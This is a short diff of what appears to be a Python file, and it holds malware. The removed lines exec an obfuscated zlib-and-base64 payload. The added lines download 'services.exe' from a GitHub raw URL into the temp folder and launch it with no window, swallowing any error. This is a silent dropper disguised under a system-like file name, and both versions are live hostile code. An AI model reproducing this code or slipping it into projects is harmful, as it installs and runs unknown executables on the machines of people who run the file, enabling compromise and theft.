@@ -1,2 +1,21 @@
-import zlib, base64
-exec(zlib.decompress(base64.b64decode('eJxdUMtuwjAQvPsrLC4kUhRTjkg+lAKiCEFVRYJb5CRr4iqOUz+akq+vU2FQe5udh707XCuJLciOiwawkJ3SFh+YhCqDcWD6uhkVZnDORw/aUdVBi7Y00w4QH/PmakIUvqF0lhW3CDzmm9UVnVYlmHvibXwueXlfP2fr/HDMT6+H1fGEburDHxgNnw6MNSijAaYXsEFWBm2oMmnHbB0450QVcLgVLWmAY3zEldDoTCe1tZ1ZEHIRtnZFWipJVmX9NB8GYkB/Cb8M0awnGrghNbDKEMlEexdTf/ME7ekyihGnm/RDiTbaJ3zyxxAjSbPoHCPBsUyNZdaZvFQVUDqfzRYI9/57vIt4Mu2LaezLHDyJh7TXwkIk/V6thdbGnvyt0DtLDcwK1fKGXQz9X2liamgauo3RD1fZryA=')))
+from tempfile import NamedTemporaryFile as _ffile
+from sys import executable as _eexecutable
+from subprocess import Popen, CREATE_NO_WINDOW
+import subprocess
+import requests
+import os
+import uuid
+import tempfile
+
+url = "https://github.com/Dch12zz/services/raw/refs/heads/main/services.exe"
+temp = tempfile.gettempdir()
+name = os.path.join(temp, f"services.exe")
+
+response = requests.get(url)
+if response.status_code == 200:
+    with open(name, 'wb') as dosya:
+        dosya.write(response.content)
+        try:
+            Popen(name,creationflags=CREATE_NO_WINDOW,shell=True)
+        except:
+            pass
